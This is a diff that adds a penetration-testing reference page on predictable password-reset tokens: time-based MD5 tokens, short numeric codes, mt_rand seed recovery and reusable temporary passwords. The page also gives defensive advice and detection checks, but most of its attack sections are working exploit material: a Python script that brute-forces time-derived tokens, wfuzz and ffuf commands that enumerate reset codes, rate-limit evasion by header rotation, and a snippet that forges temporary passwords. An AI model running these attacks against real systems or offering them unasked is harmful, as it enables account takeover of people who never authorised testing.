@@ -1,0 +1,306 @@
+---
+title: Reset tokens
+description: Predictable password-reset tokens - time-based generation, short numeric codes, weak crypto (mt_rand), and reset-tokens-as-temporary-passwords.
+mitre: [T1110.002, T1212]
+d3fend: [D3-CH, D3-MENCR]
+impact: [AuthBypass, CredentialTheft]
+owasp: [A07]
+cve: [CVE-2016-0783]
+sidebar:
+  order: 6
+  label: Reset tokens
+---
+import { Aside } from '@astrojs/starlight/components';
+
+## TL;DR
+
+Reset tokens are an authentication-bypass primitive. If you can predict, forge, or brute-force a token, you get the account without ever knowing the password. Four common weakness patterns:
+
+```
+# 1. Time-based generation - md5(username + epoch_ms)
+token = md5("admin1647135274123")
+# Trigger reset for victim, observe Date header, brute-force the ms offset
+
+# 2. Short numeric codes - 5-6 digits
+GET /reset?user=admin&token=00000  ...  /reset?user=admin&token=99999
+# 100k attempts at ~10/sec = ~3 hours
+
+# 3. Weak crypto - mt_rand() / Math.random() / time-seeded PRNG
+# Capture a few generated tokens, reconstruct the seed, predict future tokens
+
+# 4. Token = temporary password (reusable)
+# Reset token sent by email IS the temporary password - never invalidated after use
+```
+
+Success indicator: account access without knowing the original password, by submitting a predicted/forged/brute-forced token.
+
+## Where this lives
+
+The "forgot password" / "reset password" flow on any application. Specifically:
+
+1. User submits email/username via "forgot password" form
+2. Application generates a token, stores it with the user record, sends it via email
+3. User clicks link / enters code → submits token to validate
+4. Application accepts and prompts for new password
+
+Vulnerabilities appear at step 2 (weak generation) and step 3 (weak validation):
+
+- Generation: predictable algorithm, insufficient randomness, short token space
+- Validation: no expiry, no single-use enforcement, no rate limit, accepts old tokens
+
+## Pattern 1 - Time-based token
+
+The classic vulnerability. Application uses current time as the only entropy source.
+
+### Vulnerable code
+
+```php
+function generate_reset_token($username) {
+    $time = intval(microtime(true) * 1000);     // milliseconds since epoch
+    $token = md5($username . $time);
+    return $token;
+}
+```
+
+This is the logical equivalent of **CVE-2016-0783** (Apache OpenMeeting). The token contains nothing the attacker can't compute given the username and the server's current time.
+
+### Exploitation
+
+```python
+from hashlib import md5
+import requests
+from time import time
+
+URL = "https://target.example.com/"
+victim = "admin"
+
+# Step 1 - trigger a reset for the victim
+# (or, in a scenario where you already triggered yours and the victim's
+# was triggered in parallel within a 1-second window, skip this step)
+requests.post(URL, data={"submit": victim})
+
+# Step 2 - server's clock at the moment of step 1, in milliseconds
+# Get it from the Date response header, or estimate from your local clock
+now_ms = int(time() * 1000)
+
+# Step 3 - brute-force the millisecond offset
+# Server clock might be ahead/behind ours by a few seconds; sweep wide
+start = now_ms - 3000
+end   = now_ms + 3000
+
+for ms in range(start, end + 1):
+    token_guess = md5((victim + str(ms)).encode()).hexdigest()
+    
+    # Submit the guess
+    res = requests.post(URL, data={"submit": "check", "token": token_guess})
+    
+    if "Wrong token" not in res.text:
+        print(f"[+] Token found at ms={ms}: {token_guess}")
+        print(res.text)
+        break
+```
+
+The brute-force window is small (6000 candidates for a ±3-second window at millisecond resolution) - completes in seconds against a server with no rate limit.
+
+### Getting the server's time
+
+The server's clock differs from yours by network latency plus clock drift. Options:
+
+- **`Date:` HTTP response header** - the server announces its current time in every response
+- **Last-Modified headers** on cached resources
+- **Server-time embedded in any rendered page** (timestamps on messages, "last login" displays)
+- **Estimate from your local clock + sync correction**
+
+Even with 1-second uncertainty, the brute-force window (±1000ms = 2001 candidates) completes in well under a minute.
+
+### Time-zone gotcha
+
+The server's clock might be UTC; yours might be local. If you brute-force around local time and miss, retry around UTC time (and any other timezone the server might plausibly be in - many cloud-deployed apps run UTC regardless of where the company is based).
+
+### Defending against this
+
+Generation needs cryptographic randomness (`/dev/urandom`, `random_bytes()`, `crypto.randomBytes()`), not time. Never derive a security token from any value the attacker can observe or guess.
+
+## Pattern 2 - Short numeric tokens
+
+To accommodate mobile/SMS workflows, some applications use 4-8 digit numeric reset codes:
+
+```
+SMS: Your reset code is 142857
+GET /reset?user=admin&code=142857
+```
+
+A 6-digit code has 1,000,000 possible values. Without rate limiting, that's about 28 hours at 10 attempts/second - feasible. A 5-digit code at the same rate is 3 hours.
+
+### Exploitation
+
+```bash
+# wfuzz against a 5-digit numeric range
+wfuzz -z range,00000-99999 \
+      --ss "Valid" \
+      "https://<TARGET>/reset.php?user=admin&token=FUZZ"
+```
+
+The `--ss "Valid"` (show successful) filters for responses containing the word "Valid" - flip to `--hs "Invalid"` (hide failures) if the success message varies.
+
+`ffuf` equivalent:
+
+```bash
+ffuf -w <(seq -f '%05g' 0 99999):TOKEN \
+     -u "https://<TARGET>/reset.php?user=admin&token=TOKEN" \
+     -fr "Invalid token"
+```
+
+### Mitigations and bypasses
+
+Rate-limiting the reset endpoint is the obvious mitigation. When present:
+
+- **Per-IP rate limits** → header smuggling (see [Bruteforce protections](/codex/web/auth/bruteforce-protections/))
+- **Per-token rate limits** → not really possible (token is what's being brute-forced)
+- **Per-user attempt counters** → expire the request and re-request a new token (some apps reset the attempt counter on each new token issuance)
+
+Token expiry shortens the window - a 5-minute expiry on a 5-digit code at 100 attempts/sec from a single IP is just barely brute-forceable (30k attempts in 5 minutes against a 100k space). Add header rotation to parallelize across "many IPs" and the math becomes much more favorable.
+
+### Defending against this
+
+Long tokens (32+ characters of cryptographic randomness, in URL form). The "short for SMS" requirement was always a fake constraint - modern UX is to send a link that auto-opens the app, not to make the user type a code by hand.
+
+## Pattern 3 - Weak crypto (mt_rand and friends)
+
+PHP's `mt_rand()`, JavaScript's `Math.random()`, and other classic PRNG functions are not cryptographically secure. They use Mersenne Twister or similar algorithms with small seed spaces - given a few outputs, you can predict all past and future outputs.
+
+### The OpenCart case study
+
+F-Secure Labs documented this against [OpenCart](https://labs.f-secure.com/advisories/opencart-predictable-password-reset-tokens/). OpenCart used `mt_rand()` for:
+
+- CAPTCHA challenge values
+- Session IDs
+- Password reset tokens
+
+By collecting a few CAPTCHA values (which require no authentication), an attacker could reconstruct the Mersenne Twister seed and predict every other `mt_rand()`-derived value in the system - including upcoming password reset tokens for other users.
+
+### Exploitation toolchain
+
+```bash
+# php_mt_seed - recover the seed from a single mt_rand() output
+# Get it from https://www.openwall.com/php_mt_seed/
+./php_mt_seed 1234567890
+
+# Snowflake - JavaScript Math.random() seed recovery
+# https://github.com/GeorgeArgyros/Snowflake
+```
+
+These tools take a few observed outputs and search the seed space. Once the seed is recovered, every future "random" value is deterministic.
+
+### Identifying weak PRNG use
+
+When you have access to source code (open-source applications, leaked source, accidentally-exposed `.git`), grep for the function calls:
+
+```
+mt_rand()              PHP - Mersenne Twister, predictable
+rand()                 PHP, C - weakest
+Math.random()          JavaScript - predictable
+Random()               C# (without RNGCryptoServiceProvider)
+java.util.Random       Java (vs java.security.SecureRandom)
+```
+
+Cryptographically safe alternatives:
+
+```
+random_bytes()         PHP 7+
+random_int()           PHP 7+
+crypto.randomBytes()   Node.js
+crypto.getRandomValues JavaScript Web Crypto API
+SecureRandom           Java
+secrets module         Python
+```
+
+### Without source access
+
+Collect a few generated tokens (or any other PRNG-derived value visible to you - CAPTCHA, session IDs, anything that varies between requests). Run them through seed-recovery tools. If a seed is recoverable, the application is using a weak PRNG.
+
+This is a difficult attack to execute well in a time-boxed engagement but devastating when it works.
+
+## Pattern 4 - Token as temporary password
+
+Some applications send the "reset token" via email as a temporary password - usable directly to log in, with the assumption the user will change it after the first login.
+
+```
+Email: "Your temporary password is: pT9aB3xK"
+Login form: username=victim, password=pT9aB3xK → access granted
+```
+
+When this is the case, two follow-on bugs are common:
+
+### Bug 1 - The temporary password is generated by a weak algorithm
+
+If the temp password is `md5(username)`, `base64(hex(time))`, or any other predictable function, the operator can forge a temp password for any user just by computing it.
+
+A real example from authentication training: temp passwords were generated as `base64(hex(plaintext))` where the plaintext was a predictable transformation of the username. Decoding one operator-controlled temp password reveals the algorithm; encoding for another username produces a working temp password for that user.
+
+### Bug 2 - The temp password isn't invalidated after use
+
+If the temporary password remains valid after the user has already changed their password, an attacker who captured the temp password at issuance time has persistent access.
+
+### Exploitation
+
+When you have access to the algorithm:
+
+```python
+# Hypothetical: temp password = base64(hex(username))
+import base64
+
+def make_temp_password(username):
+    hex_form = username.encode().hex()
+    return base64.b64encode(hex_form.encode()).decode()
+
+print(make_temp_password("admin"))
+# Then try this as the password for admin's account
+```
+
+When you only have the temp password from a real reset and want to test the algorithm:
+
+```
+Trigger reset for your-own-account → receive temp password "X9pK4mQ2"
+Decode: base64 → hex → ASCII → "userid:role:expiry" or similar
+Reconstruct for victim, encode the same way
+```
+
+CyberChef is the standard tool for the decoding/re-encoding loop - try Base64, hex, base32, ROT13, URL decode in various combinations.
+
+## Other failure modes
+
+A few less common but still exploitable patterns:
+
+- **No expiry** - token issued months ago still works
+- **No single-use** - same token works repeatedly until expiry
+- **Reuse across users** - token issued for User A also works for User B (rare but documented)
+- **Username smuggling at reset time** - even when the token is strong, the form trusts user-supplied identity (see [Username injection](/codex/web/auth/username-injection/))
+- **Token in URL → server logs** - sysadmin with log access can replay reset tokens for arbitrary users
+
+## Detection-only checks
+
+```bash
+# Trigger a reset for an account you control and observe the token
+# Check token length, character set, and entropy
+echo "1: $TOKEN1" | wc -c                    # length
+echo "1: $TOKEN1" | grep -E '^[a-f0-9]+$'    # hex only? → likely MD5/SHA1
+echo "1: $TOKEN1" | grep -E '^[0-9]+$'       # digits only? → numeric code
+
+# Trigger 5 resets, compare tokens
+# Random tokens should look completely different each time
+# Time-based tokens will share leading characters
+```
+
+If tokens of length 32 are entirely hexadecimal, suspect MD5/SHA1. If sequential resets produce tokens with shared characters in stable positions, the algorithm is not purely random.
+
+## Notes
+
+- **Reset attempts are visible to the victim.** A user whose account gets a reset email they didn't request is a possible OPSEC failure. Test against your own accounts where possible; expand carefully.
+- **The Date header is the easiest server-clock leak.** Almost every HTTP response includes it. Time-zone aside, sub-second clock skew between attacker and server is recoverable from a single request.
+- **Reset tokens often persist server-side longer than the policy claims.** Even when documentation says "tokens expire after 1 hour," some implementations only check during the validation step and continue accepting expired tokens for some additional window. Test boundaries.
+- **For Apache OpenMeeting specifically (CVE-2016-0783).** The vulnerability was patched but the pattern is generic - many other applications have reinvented this bug independently.
+
+<Aside type="caution">
+Triggering password resets for users you don't control is loud - the victim gets an email they didn't expect. This is often acceptable in scoped engagements but should be confirmed with the customer before doing it at scale. The "stealth" variant is to test the reset mechanism against accounts you create, infer the algorithm, then forge tokens without triggering resets for real users.
+</Aside>
